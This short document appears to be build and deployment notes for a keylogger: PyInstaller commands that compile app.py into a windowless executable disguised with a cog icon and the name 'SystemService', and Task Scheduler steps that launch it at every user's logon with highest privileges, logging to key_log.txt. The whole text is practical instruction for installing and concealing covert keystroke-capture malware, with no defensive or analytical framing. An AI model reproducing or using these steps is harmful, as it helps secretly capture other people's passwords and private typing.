# Install EXE
pyinstaller --onefile --noconsole --icon=cog.ico app.py

# Install EXE (SystemService name)
pyinstaller --onefile --noconsole --icon=cog.ico --name=SystemService app.py

# Running from Task Scheduler
1. Make sure to give full path (absolute) for the key_log.txt file
2. Set these options in Task Scheduler:
    2.1. Trigger => At logon of any user
    2.2. Run only when user is logged one
    2.3. Check Run with Highest Privileges
    2.4. In actions tab, select your exe